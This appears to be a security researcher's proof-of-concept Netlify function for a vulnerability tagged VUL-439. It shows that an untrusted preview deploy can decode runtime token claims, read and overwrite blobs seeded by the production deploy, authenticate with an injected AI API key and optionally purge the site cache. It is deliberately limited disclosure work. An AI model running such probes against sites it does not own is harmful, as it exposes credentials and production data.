import { getStore } from '@netlify/blobs'

// VUL-439 runtime-credential probe. Proportionate "does it actually work" tests:
//   - Blobs: read back a key the TRUSTED (production) deploy seeded, proving an
//     untrusted preview reads owner-written production data. Values are our own
//     non-secret markers.
//   - AI: read-only GET /models (an auth check). NO completion -> nothing billed.
//   - Purge: actually purges YOUR cache, so it is gated behind ?confirm=purge
//     and off by default.
// Never prints a token value; only decoded claims (JWT body) and the base URLs.
const decodeClaims = (jwt) => {
  try {
    const [, body] = String(jwt).split('.')
    return JSON.parse(Buffer.from(body, 'base64url').toString())
  } catch {
    return '<not a JWT>'
  }
}

const SEED_KEY = 'vul439/owner-seed'

export default async (req) => {
  const url = new URL(req.url)
  const context = process.env.CONTEXT || null
  const out = { context, deploy_id: process.env.DEPLOY_ID || null }

  // ---- credential claims (presence + scope) ----
  const ctx = process.env.NETLIFY_BLOBS_CONTEXT
  if (ctx) {
    let parsed
    try {
      parsed = JSON.parse(Buffer.from(ctx, 'base64').toString())
    } catch {
      parsed = null
    }
    if (parsed) {
      out.blobs_context = {
        siteID: parsed.siteID,
        deployID: parsed.deployID ?? null,
        token_len: parsed.token?.length ?? 0,
        token_claims: decodeClaims(parsed.token),
      }
    }
  }

  // ---- Blobs cross-trust read: read the key BEFORE overwriting it, tagging
  // the value with this deploy's own id. Call the production URL first, then the
  // preview URL: if the preview's read-before-write shows the PRODUCTION deploy
  // id (different from the preview's own), an untrusted preview just read data a
  // trusted deploy wrote to the shared store. CONTEXT/DEPLOY_ID are build-time
  // only, so we use blobs_context.deployID, which is present at runtime.
  try {
    const store = getStore('vul439-canary')
    const myDeploy = out.blobs_context?.deployID || 'unknown'
    out.blobs_read_before_write = await store.get(SEED_KEY)
    await store.set(SEED_KEY, `written-by-deploy-${myDeploy}`)
    out.blobs_wrote_as = myDeploy
  } catch (err) {
    out.blobs_error = err.message
  }

  // ---- AI gateway: read-only models list (auth check, no completion) ----
  const aiBase = process.env.OPENAI_BASE_URL || null
  const aiKey = process.env.OPENAI_API_KEY
  out.ai_base_url = aiBase
  if (aiBase && aiKey) {
    const tryModels = async (u) => {
      try {
        const r = await fetch(u, { headers: { Authorization: `Bearer ${aiKey}` } })
        let count = null
        const text = (await r.clone().text()).slice(0, 200)
        try {
          const j = JSON.parse(text)
          count = Array.isArray(j?.data) ? j.data.length : null
        } catch {}
        return { url: u, status: r.status, model_count: count, body_snippet: text }
      } catch (err) {
        return { url: u, error: err.message }
      }
    }
    const base = aiBase.replace(/\/$/, '')
    // Report the auth control (no key) alongside the authed call, so a 200 with
    // key vs 401 without proves the key is what authenticates.
    out.ai_models = await tryModels(`${base}/v1/models`)
    try {
      const noKey = await fetch(`${base}/v1/models`)
      out.ai_models_no_key_status = noKey.status
    } catch (err) {
      out.ai_models_no_key_error = err.message
    }
  }

  // ---- Purge: actually purges YOUR cache. Off unless explicitly confirmed. ----
  if (url.searchParams.get('confirm') === 'purge') {
    const token = process.env.NETLIFY_PURGE_API_TOKEN
    try {
      const r = await fetch('https://api.netlify.com/api/v1/purge', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json; charset=utf8', Authorization: `Bearer ${token}` },
        body: JSON.stringify({ site_id: process.env.SITE_ID }),
      })
      out.purge = { status: r.status }
    } catch (err) {
      out.purge = { error: err.message }
    }
  } else {
    out.purge = 'skipped (append ?confirm=purge to purge YOUR OWN cache)'
  }

  return Response.json(out)
}
